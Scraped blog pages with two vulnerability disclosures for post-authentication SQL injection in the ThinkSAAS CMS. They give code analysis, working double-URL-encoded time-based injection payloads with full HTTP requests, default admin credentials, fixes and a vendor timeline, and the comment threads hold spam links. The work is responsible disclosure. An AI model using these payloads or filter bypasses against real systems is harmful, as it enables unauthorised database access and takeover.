=== Content from blog.unc1e.com_df8d3375_20250119_133149.html ===

[跳至主要内容](#main)

# [unc1e's penetration articles](https://blog.unc1e.com/)

搜索

### 搜索此博客

### ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 （bypass of CVE-2020-35337）

[七月 31, 2021](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html "permanent link")

## 0x01 Summay

In last December last year, there were security problems caused by improper URLDecode. Reference<https://github.com/thinksaas/ThinkSAAS/issues/24>

To sum up, it is in`ThinkSAAS-master\app\topic\action\admin\topic.php`, improper filtering of keyword parameters leads to SQL injection.

In last year's fix plan (click[Here](https://github.com/thinksaas/ThinkSAAS/commit/771ade71e29d85fbeed06a97b5efde2690bf0bc8#diff-96592e102fa5e61c02150b963d7e30f03b7a5270be074b22091c1aca4bb321fb)Direct), the first is`$title`Changed`$kw`Variable,

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659360851-7a2f4613-4d14-4e50-b8f2-4a80553898ba.png)

And, after`tsFilter`Function filtering.

However, there are still security risks now.

```
# Responsible Vulnerability Disclosure info

Title:
	ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php

Desc:
  ThinkSAAS before 3.52 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter（need the privilege of admin）, allowing logged attackers to execute arbitrary SQL commands.	This is a bypass of CVE-2020-35337.

CVSS v3.1 Vector:
- 7.5
AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/MUI:N/MS:C/MC:H/MI:H/MA:H

Result:
	The vendor has confirmed this vuln and updated [ThinkSAAS 3.53] to fix this vuln.

Reference:
-
-
```

## 0x02 security vulnerability analysis

**Global filtering analysis**

In `ThinkSAAS-master\thinksaas\thinksaas.php#62`, use`tsgpc`Filter

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627663829766-a96c94c9-22ec-4cc0-a9dc-28bcf896db97.png)

Using `addslashes`  to prevent SQL injection

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627663858126-47c04960-1fac-475c-b66a-e90c628e2fe3.png)

### (1)`tsFilter`Improper function filtering logic

`tsFilter`Function`ThinkSAAS-master\thinksaas\tsFunction.php`In (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/eaa963e663b992196acd9d0ef8cb45b7f66d9418/thinksaas/tsFunction.php#L2242)Direct)

This function replaces some of the dangerous keywords with null, but an error is made here: it is replaced only once, causing attackers to use the double-write method to construct

```
SELselect ECT
```

To escape from the real`SELECT`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659592602-9623c52a-9793-4a5e-863f-9e6daa462ae6.png)

Therefore, we recommend that you**Replace only once**The`If`, change to meeting**Loop replacement**The`While`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659752682-96b90f17-1471-4b3f-b526-fc0155584a47.png)

### (2) improper filtering order

Please note: The problem in (1) just now is not the most important-even if there is no problem in (1), we can also carry out SQL injection attacks.

In`app/topic/action/admin/topic.php`In the implementation of the logic (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/771ade71e29d85fbeed06a97b5efde2690bf0bc8/app/topic/action/admin/topic.php#L13)Direct), is the user input variable`$_get ['kw']`The SQL injection vulnerability is caused by filtering and then using URLDecode function decoding.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627660025557-27b06121-55ed-4017-9ca9-af6d5eebd485.png)

In short, it is**The value of the filter.**With**Finally concatenate and substitute the values of the Query Database**Problems caused by differences.

The procedure is as follows:

```
1, User-input param: %2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520

2, the $kw param Server received（has been auto UrlDecoded for once）: %50%6f%43%27%20%61%6e%64%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%73%6c%65%65%70%28%31%29%29%78%29%20%2d%2d%20
  - goto thinksaas/thinksaas.php#62 via tsgpc()
  - tsgpc() actually do addslashes() to escape [',"]【there is no [',"], you konw】
  - then via the line 13 tsFilter() to filter black-word【actually do no operation】
	- param no change

3, $kw=urldecode(tsFilter($_GET['kw']));
 notice the $kw param has been UrlDecoded agained (for twice, you know):
PoC' and (select 1 from (select sleep(1))x) --

4，So the impace is: Post-Auth SQL-injection（后台SQL注入）:
SELECT * FROM ts_topic WHERE `title` like '%PoC' and (select 1 from (select sleep(1))x) -- %' ORDER BY addtime desc
```

Or if you still feel unclear, you can`thinksaas\tsApp.php#165`Add the debugging code of "print SQL statement", as shown in the following figure:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627661422093-684f8c59-66cf-4313-8f54-2eb4603bf14d.png)

```
GET /index.php?app=topic&ac=admin&mg=topic&ts=list&kw=%2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520 HTTP/1.1
Host: thinksaas
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://thinksaas/index.php?install=result
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=t86vbus6e31om7uv1mrskb3ea5; Hm_lvt_5964cd4b8810fcc73c98618d475213f6=1627657957; Hm_lpvt_5964cd4b8810fcc73c98618d475213f6=1627657957
Connection: close

```

Causing a delay of 2 seconds

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627661966854-41a1c6bb-2a56-4765-81f4-711aa0bea81f.png)

## 0x03 vulnerability verification(PoC & EXPLOIT)

```
GET /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC%%2527+and/**/1-(select/**/1/**/from/**/(select+sleep(3))a)%2523%2520 HTTP/1.1
Host: thinksaas
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4230.1 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://thinksaas/index.php?app=search&ac=s&kw=keyword
Cookie: PHPSESSID=6im4ssqo33h8l2d43u78nbr4c3;  ts_autologin=goh59atl3dsk44o4sws48s80co44ww8
Upgrade-Insecure-Requests: 1

```
#

First, access the system management login interface, enter the account and password to log on to the background.

```
http://thinksaas/index.php?app=user&ac=system
- Default password is:
- admin@admin.com / 123456
```

Next, visit the URL

```
http://thinksaas//index.php?app=topic&ac=admin&mg=topic&ts=list&kw=%2550%256f%2543%2527%2520%2561%256e%2564%2520%2528%2573%2565%256c%2565%2563%2574%2520%2531%2520%2566%2572%256f%256d%2520%2528%2573%2565%256c%2565%2563%2574%2520%2573%256c%2565%2565%2570%2528%2531%2529%2529%2578%2529%2520%252d%252d%2520
```

A 2-second latency is observed on the web page, which is the proof of concept (PoC) of the vulnerability.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627662223414-31164b03-4867-4608-8865-ecb0f45cd163.png)

When exploiting this vulnerability, attackers can use logical operations to fully control the database, query information in the database, write data to webshell, and other dangerous operations.

## 0x04 vulnerability fix

### (1) optimization`tsFilter`Function

`tsFilter`Function`ThinkSAAS-master\thinksaas\tsFunction.php`In (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/eaa963e663b992196acd9d0ef8cb45b7f66d9418/thinksaas/tsFunction.php#L2242)Direct)

We recommend that you do not use a blacklist to prevent SQL injection. However, if the solution is fixed, you can tsFunction the function**Replace only once**The`If`, change to meeting**Loop replacement**The`While`

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1627659752682-96b90f17-1471-4b3f-b526-fc0155584a47.png)

### (2) fixed the logic in topic.php.

Best remove`urldecode`, filter directly.

If [decode first, then filter], there is still a risk, because the URLDecode decode, so that attackers can bypass the global`tsgpc()`To prevent SQL injection, use the addslashes function correctly.

Will`app/topic/action/admin/topic.php`In the implementation of the logic (click[Here](https://github.com/thinksaas/ThinkSAAS/blob/771ade71e29d85fbeed06a97b5efde2690bf0bc8/app/topic/action/admin/topic.php#L13)Direct), changed

```
$kw=tsFilter($_GET['kw']);  //推荐写法
```

## 0x05 Time Line

* 2021.07.31 08:40, Qianxin, Network Security Department, Product-Safety Team ( Unc1e ) reported this issue to the developer of ThinkSAAS, via Wechat.
* 2021.07.31 09:07, ThinkSAAS confirmed this vulnerability.

* 2021.07.31 09:26, Qianxin, Network Security Department, Product-Safety Team ( Unc1e ) reviewed the mitigation of this vuln. (See <https://github.com/thinksaas/ThinkSAAS/commit/07ad8499afebd452647e2a95996ff90496d98093#diff-96592e102fa5e61c02150b963d7e30f03b7a5270be074b22091c1aca4bb321fb>)
* 2021.07.31 12:00, ThinkSAAS updated ThinkSAAS 3.53 to fix this vuln.

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 标签

[CVE](https://blog.unc1e.com/search/label/CVE)

标签：
[CVE](https://blog.unc1e.com/search/label/CVE)

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 评论

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[acanthajaecee](https://www.blogger.com/profile/07353057142354263177)[2022年3月3日 09:19](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html?showComment=1646313554850#c8714612214967733609)

   Caesars Palace - Dr.MCD
   Dr.MCD is a San Francisco based casino [강원도 출장샵](https://drmcd.com/%EA%B0%95%EC%9B%90%EB%8F%84%EC%A3%BC%EB%B3%80-%EA%B0%80%EA%B9%8C%EC%9A%B4%EC%B6%9C%EC%9E%A5%EC%95%88%EB%A7%88.html/) information [진주 출장마사지](https://www.jtmhub.com/%EC%A7%84%EC%A3%BC%EC%B6%9C%EC%9E%A5%EC%95%88%EB%A7%88%EC%9D%B8%EA%B8%B0-%EC%88%9C%EC%9C%84.html/) service. The casino [김포 출장마사지](https://www.mapyro.com/%EA%B9%80%ED%8F%AC%EC%A3%BC%EB%B3%80-%EA%B0%80%EA%B9%8C%EC%9A%B4%EC%B6%9C%EC%9E%A5%EC%95%88%EB%A7%88.html/) provides you with [서귀포 출장안마](https://www.mapyro.com/%EC%84%9C%EA%B7%80%ED%8F%AC%EC%B5%9C%EB%8C%80%EA%B7%9C%EB%AA%A8%EC%B6%9C%EC%9E%A5%EC%83%B5.html/) your daily necessities such as bottled water and snacks. [양주 출장샵](https://drmcd.com/%EC%96%91%EC%A3%BC%EC%B5%9C%EC%83%81%EC%9D%98-%EA%B4%80%EB%A6%AC%EC%B6%9C%EC%9E%A5%EC%95%88%EB%A7%88.html/) With

   回复[删除](https://www.blogger.com/delete-comment.g?blogID=7982656076194309282&postID=8714612214967733609)回复
   回复

添加评论加载更多...

#### 发表评论

### 此博客中的热门博文

### [MKCMS V6.2 has mutilple vulnerabilities](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html)

[四月 11, 2020](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html "permanent link")

0x00:Lead In Source code can be downloaded  at  https://www.lanzous.com/ib7zwmh This CMS is kinda funny, coz there is a universal filter addslashes  in /system/library.php /system/library.php <?php ... if ( ! get\_magic\_quotes\_gpc ()) { if ( ! empty ( $\_GET )) { $\_GET = addslashes\_deep ( $\_GET ); } if ( ! empty ( $\_POST )) { $\_POST = addslashes\_deep ( $\_POST ); } $\_COOKIE = addslashes\_deep ( $\_COOKIE ); $\_REQUEST = addslashes\_deep ( $\_REQUEST ); } function addslashes\_deep ( $\_var\_0 ) { if ( empty ( $\_var\_0 )) { return $\_var\_0 ; } else { return is\_array ( $\_var\_0 ) ? array\_map ( 'addslashes\_deep' , $\_var\_0 ) : addslashes ( $\_var\_0 ); } \_var\_0 } While it uses stripslashes somewhere by mistake, let's do a global search about it, we get 3 SQL injections 0x01:PreAuth SQL injection in /ucenter/repass.php MKCMS V6.2 has SQL injection via the /ucenter/repass.php n...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[发表评论](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html#comments)

[阅读全文](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html "MKCMS V6.2 has mutilple vulnerabilities")

### [Thinksaas has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html)

[十二月 03, 2020](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html "permanent link")

1. Intro of this CMS The repo of ThinksaasS is located at https://github.com/thinksaas/ThinkSAAS , quite a common-used CMS. Source code of v3.38  could be downloaded at https://www.thinksaas.cn/service/down/ , while passcode of downlaoding is thinksaas9999 of this Vuln ThinkSAAS before 3.38 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter, allowing remote attackers to execute arbitrary SQL commands. 2. Walkthrough Code Review Risky lines are here =>   https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/app/topic/action/admin/topic.php#L42 https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/thinksaas/tsApp.php#L146 Due to unproper conjunction of SQL query sentences (1) and invalid filter (2) (1) unproper conjunction of SQL query sentences app/topic/action/admin/topic.php#L42 Let's see how findAll() works: thinksaas/tsApp.p...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[4 条评论](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html#comments)

[阅读全文](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html "Thinksaas has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php")

### 归档

* [七月 20211](https://blog.unc1e.com/2021/07/)
* [二月 20211](https://blog.unc1e.com/2021/02/)
* [十二月 20201](https://blog.unc1e.com/2020/12/)
* [四月 20201](https://blog.unc1e.com/2020/04/)

### 标签

* [CVE](https://blog.unc1e.com/search/label/CVE)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)

[由 Blogger 提供支持](https://www.blogger.com)



=== Content from blog.unc1e.com_370b1e29_20250119_133149.html ===

[跳至主要内容](#main)

# [unc1e's penetration articles](https://blog.unc1e.com/)

搜索

### 搜索此博客

## 博文

目前显示的是 十二月, 2020的博文

[显示全部](https://blog.unc1e.com/)

### [Thinksaas has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html)

[十二月 03, 2020](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html "permanent link")

1. Intro of this CMS The repo of ThinksaasS is located at https://github.com/thinksaas/ThinkSAAS , quite a common-used CMS. Source code of v3.38  could be downloaded at https://www.thinksaas.cn/service/down/ , while passcode of downlaoding is thinksaas9999 of this Vuln ThinkSAAS before 3.38 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter, allowing remote attackers to execute arbitrary SQL commands. 2. Walkthrough Code Review Risky lines are here =>   https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/app/topic/action/admin/topic.php#L42 https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/thinksaas/tsApp.php#L146 Due to unproper conjunction of SQL query sentences (1) and invalid filter (2) (1) unproper conjunction of SQL query sentences app/topic/action/admin/topic.php#L42 Let's see how findAll() works: thinksaas/tsApp.p...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[4 条评论](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html#comments)

[阅读全文](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html "Thinksaas has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php")

[更多博文](https://blog.unc1e.com/search?updated-max=2020-12-03T05:53:00-04:00&max-results=7 "更多博文")

### 归档

* [七月 20211](https://blog.unc1e.com/2021/07/)
* [二月 20211](https://blog.unc1e.com/2021/02/)
* [十二月 20201](https://blog.unc1e.com/2020/12/)
* [四月 20201](https://blog.unc1e.com/2020/04/)

### 标签

* [CVE](https://blog.unc1e.com/search/label/CVE)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)

[由 Blogger 提供支持](https://www.blogger.com)



=== Content from blog.unc1e.com_e12c7b9a_20250119_114447.html ===

[跳至主要内容](#main)

# [unc1e's penetration articles](https://blog.unc1e.com/)

搜索

### 搜索此博客

### Thinksaas has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php

[十二月 03, 2020](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html "permanent link")

**1. Intro**

**of this CMS**

The repo of ThinksaasS
is located at <https://github.com/thinksaas/ThinkSAAS> , quite a common-used
CMS.

Source code of v3.38 could be downloaded
at <https://www.thinksaas.cn/service/down/> , while passcode of
downlaoding is thinksaas9999

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6FTzG0W7gXfauBab3_D_pOiD0JD-O5vwBZtrEmFp1rvwsAZGwANV_hAAtvaLfVyMUett3EgnJ1vkuDzLqt79O_fTW8agWzAmEl1XguVsS96mxFVPl3Tjp_frlRJnJ8713K59cGT8h9i2a/)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6FTzG0W7gXfauBab3_D_pOiD0JD-O5vwBZtrEmFp1rvwsAZGwANV_hAAtvaLfVyMUett3EgnJ1vkuDzLqt79O_fTW8agWzAmEl1XguVsS96mxFVPl3Tjp_frlRJnJ8713K59cGT8h9i2a/)

**of this Vuln**

ThinkSAAS before 3.38
has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter,
allowing remote attackers to execute arbitrary SQL commands.

**2. Walkthrough**

**Code Review**

Risky lines are here
=>

* <https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/app/topic/action/admin/topic.php#L42>
* <https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/thinksaas/tsApp.php#L146>

Due to unproper
conjunction of SQL query sentences **(1)** and invalid filter **(2)**

**(1) unproper conjunction of SQL query sentences**

[app/topic/action/admin/topic.php#L42](https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/app/topic/action/admin/topic.php#L42)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrVRKIfzPl3kX-kKLiaarAkd0HJ7HHMDRPtsAcunwTj3PJD5OW_NHfzlfmOGETpqFVKMxD-pLvJdZCb79p-qB_bQZhaXp0W40FG5aaDoh8Zm3ZLHMGixy0YvVXRhw53d5LrwPwb3oz_WlN/)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrVRKIfzPl3kX-kKLiaarAkd0HJ7HHMDRPtsAcunwTj3PJD5OW_NHfzlfmOGETpqFVKMxD-pLvJdZCb79p-qB_bQZhaXp0W40FG5aaDoh8Zm3ZLHMGixy0YvVXRhw53d5LrwPwb3oz_WlN/)

Let's see how findAll() works:

[thinksaas/tsApp.php#L146](https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/thinksaas/tsApp.php#L146)

![正在上传：已上传 51875 字节（共 51875 字节）。](https://www.blogger.com/img/transparent.gif)

Till now, $where is partly controlled
by us, once injecting a singal quote ' via $title, while how to closen this query sentence is still unknown, cause the
filtering of   # and --

However, the function
of  urldecode() helped us, we can
craft a double-URLencoded params, like %25%23 >>> %23 >>>
# , ( namely %2523 stands for # )  , as it will
BYPASS the filter (#) as follows.

So we have a vuln of
SQLi. Let's see the sanitizing functions.

**(2) invalid filter**

This CMS have some
global functions for sanitizing user-controlled params, in /thinksaas/tsFunction.php#2134 , as its link goes [here](https://github.com/thinksaas/ThinkSAAS/blob/b0361f49cb026ad33b7df6b15539bec6dadd24b0/thinksaas/tsFunction.php#L2134)

function tsFilter($value) {

$value = trim($value);

//定义不允许提交的SQl命令和关键字

$words = array();

$words[] = "add ";

$words[] = "and ";

$words[] = "count ";

$words[] = "order ";

$words[] = "table ";

$words[] = "by ";

$words[] = "create ";

$words[] = "delete ";

$words[] = "drop ";

$words[] = "from ";

$words[] = "grant ";

$words[] = "insert ";

$words[] = "select ";

$words[] = "truncate ";

$words[] = "update ";

 $words[] = "use ";

$words[] = "--";

$words[] = "#";

$words[] = "group\_concat";

$words[] = "column\_name";

$words[] = "information\_schema.columns";

$words[] = "table\_schema";

$words[] = "union ";

$words[] = "where ";

$words[] = "alert";

$value = strtolower($value);

//转换为小写

foreach ($words as $word) {

if (strstr($value, $word)) {

            $value = str\_replace($word, '',
$value);

}

}

return $value;

}

Apart from that foreach ($words as
$word) { cannot comletely sanitize those evil words, the Blacklists itself is
invalid as well. While SELselect ECT 1  could still be used ( as SELselect ECT 1 => SELECT 1 ).

Also, one is abe to use
select/\*\*/1 instead of select 1 , in order to bypass
the blackword of select .

As above, select/\*\*/1/\*\*/from/\*\*/(sleep(1)
could be used.

In summary, we can
craft a special payload ( double-URLencoded + SQL injection ) to
trigger SQLi vulns, of course we need login first...

**PoC & EXPLOIT**

GET /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC%%2527+and/\*\*/1-(select/\*\*/1/\*\*/from/\*\*/(select+sleep(3))a)%2523%2520 HTTP/1.1

Host: thinksaas

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/86.0.4230.1 Safari/537.36

Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8

Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Connection: close

Referer: http://thinksaas/index.php?app=search&ac=s&kw=keyword

Cookie: PHPSESSID=6im4ssqo33h8l2d43u78nbr4c3;
ts\_autologin=goh59atl3dsk44o4sws48s80co44ww8

Upgrade-Insecure-Requests: 1

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjeGbE_Vi5l7Z4EwlPLD6iU8rkQuAOezr_fvs1F1mFapSaK2BOcbrFMeo6140lMvjtASjAdj8u-DACOrAeDY4w3GmmmP__7apol9FDMJ2NcqXFPMWHfuqmeH7Pdgwqe3ztYbEPR_dkKqj2C/)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjeGbE_Vi5l7Z4EwlPLD6iU8rkQuAOezr_fvs1F1mFapSaK2BOcbrFMeo6140lMvjtASjAdj8u-DACOrAeDY4w3GmmmP__7apol9FDMJ2NcqXFPMWHfuqmeH7Pdgwqe3ztYbEPR_dkKqj2C/)

**3. Mitigations**

After URLdecode , param sanitizing may
still be neccessary, a possible demo is as follows:

if($title){

            //$where = "`title` like
'%$title%'";

            $where = "`title` like
'%". $this->escape($title). "%'";

}

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 标签

[CVE](https://blog.unc1e.com/search/label/CVE)

标签：
[CVE](https://blog.unc1e.com/search/label/CVE)

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

### 评论

1. ![](//www.blogger.com/img/blogger_logo_round_35.png)[ThinkSAAS](https://www.blogger.com/profile/07434014153549824595)[2020年12月3日 21:21](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html?showComment=1607044886790#c6249336037289091811)

   你好，是否是系统管理员登录的情况下？

   回复[删除](https://www.blogger.com/delete-comment.g?blogID=7982656076194309282&postID=6249336037289091811)回复
   - ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unc1e](https://www.blogger.com/profile/11580711979714192832)[2020年12月8日 04:52](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html?showComment=1607417565566#c262108771871296636)

     是的, 是在系统管理员登录的情况下。Yes, it's a Post-Auth SQL Injection

     [删除](https://www.blogger.com/delete-comment.g?blogID=7982656076194309282&postID=262108771871296636)回复
     回复
   回复
2. ![](//www.blogger.com/img/blogger_logo_round_35.png)[Unow22](https://www.blogger.com/profile/13834875343243600539)[2021年10月12日 11:26](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html?showComment=1634052391417#c2860179261709284660)

   The best part about this mouthwash is that you can easily carry this small one-ounce bottle anywhere and can swish your mouth for merely a few minutes to detox from THC before the test with ease. There are four predominant types of tests that you should be prepared for before the trial. Knowing how these tests operate and their detection window makes it easier to opt from the various detoxification methods. As per Mayo Clinic, the amount of time THC is evident in urine varies according to the amount and frequency of cannabis consumed by the candidates. To maximize the THC detoxing effects of your workout routine, it’s also great if you can hop in a steam bath or sauna to further sweat out those nasty cannabinoids. If you have the time, patience, and discipline to not touch a bong or chomp on an edible for a relatively short period of time, then the abstinence method is going to come easily to you.

   回复[删除](https://www.blogger.com/delete-comment.g?blogID=7982656076194309282&postID=2860179261709284660)回复
   回复
3. ![](//www.blogger.com/img/blogger_logo_round_35.png)[aaronnquercia](https://www.blogger.com/profile/09464766298363468180)[2022年3月4日 21:39](https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html?showComment=1646444350968#c2347100507546946126)

   How to get to Wynn Las Vegas by Bus, taxi or ride - DRM
   Directions to Wynn Las Vegas (Nevada) with public transportation. [경산 출장안마](https://drmcd.com/%EA%B2%BD%EC%82%B0%EA%B0%80%EC%9E%A5-%EC%9D%B8%EA%B8%B0-%EC%9E%88%EB%8A%94%EC%B6%9C%EC%9E%A5%EC%95%88%EB%A7%88%EA%B0%80%EA%B2%8C.html) The [공주 출장마사지](https://www.mapyro.com/%EA%B3%B5%EC%A3%BC%EC%B6%9C%EC%9E%A5%EC%83%B5.html) following transit [진주 출장샵](https://www.jtmhub.com/%EC%A7%84%EC%A3%BC%EC%B6%9C%EC%9E%A5%EC%95%88%EB%A7%88%EC%9D%B8%EA%B8%B0-%EC%88%9C%EC%9C%84.html) lines [동해 출장마사지](https://www.mapyro.com/%EB%8F%99%ED%95%B4%EC%97%90-%EB%8C%80%ED%95%9C-%EC%9A%B0%EC%88%98%ED%95%9C%EC%B6%9C%EC%9E%A5%EC%83%B5%EB%A6%AC%EB%B7%B0.html) have routes that [동두천 출장마사지](https://drmcd.com/%EB%8F%99%EB%91%90%EC%B2%9C%EC%B5%9C%EA%B3%A0%EC%8B%9C%EC%84%A4%EC%B6%9C%EC%9E%A5%EC%95%88%EB%A7%88.html) pass near Wynn Las Vegas and

   回复[删除](https://www.blogger.com/delete-comment.g?blogID=7982656076194309282&postID=2347100507546946126)回复
   回复

添加评论加载更多...

#### 发表评论

### 此博客中的热门博文

### [MKCMS V6.2 has mutilple vulnerabilities](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html)

[四月 11, 2020](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html "permanent link")

0x00:Lead In Source code can be downloaded  at  https://www.lanzous.com/ib7zwmh This CMS is kinda funny, coz there is a universal filter addslashes  in /system/library.php /system/library.php <?php ... if ( ! get\_magic\_quotes\_gpc ()) { if ( ! empty ( $\_GET )) { $\_GET = addslashes\_deep ( $\_GET ); } if ( ! empty ( $\_POST )) { $\_POST = addslashes\_deep ( $\_POST ); } $\_COOKIE = addslashes\_deep ( $\_COOKIE ); $\_REQUEST = addslashes\_deep ( $\_REQUEST ); } function addslashes\_deep ( $\_var\_0 ) { if ( empty ( $\_var\_0 )) { return $\_var\_0 ; } else { return is\_array ( $\_var\_0 ) ? array\_map ( 'addslashes\_deep' , $\_var\_0 ) : addslashes ( $\_var\_0 ); } \_var\_0 } While it uses stripslashes somewhere by mistake, let's do a global search about it, we get 3 SQL injections 0x01:PreAuth SQL injection in /ucenter/repass.php MKCMS V6.2 has SQL injection via the /ucenter/repass.php n...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[发表评论](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html#comments)

[阅读全文](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html "MKCMS V6.2 has mutilple vulnerabilities")

### [ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 （bypass of CVE-2020-35337）](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html)

[七月 31, 2021](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html "permanent link")

